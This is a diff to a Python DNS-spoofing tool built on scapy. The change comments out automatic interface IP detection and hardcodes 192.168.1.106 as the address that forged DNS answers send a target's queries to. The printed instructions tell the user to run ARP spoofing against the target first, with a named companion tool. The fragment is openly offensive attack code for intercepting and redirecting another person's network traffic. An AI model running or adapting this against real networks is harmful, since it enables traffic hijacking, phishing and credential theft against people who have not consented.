@@ -107,7 +107,7 @@ def getip():
         print("\n [Warning] --> coulnd't find a valid Interface for DNS spoofing - Exiting ....")
         time.sleep(2)
         exit()
-ip = getip()
+#ip = getip()
 print("\n[Instruction] --> It is necessary to run ARP spoofing against your target")
 print("[Instruction] --> You can use XEye-tp tool \"https://github.com/Engmostafa26/XEye-tp\"")
 time.sleep(3)
@@ -122,8 +122,8 @@ try:
             reqname = ippacket[sc.DNSQR].qname
             print(ippacket.show())
             if domain in str(reqname):
-                print("[Congrats] --> Target is spoofed and directed to "+ip+" ....")
-                anspof = sc.DNSRR(rrname=domain, rdata=ip)
+                print("[Congrats] --> Target is spoofed and directed to 192.168.1.106 ....")
+                anspof = sc.DNSRR(rrname=domain, rdata="192.168.1.106")
                 ippacket[sc.DNS].an = anspof
                 ippacket[sc.DNS].ancount = 1
                 del ippacket[sc.IP].len
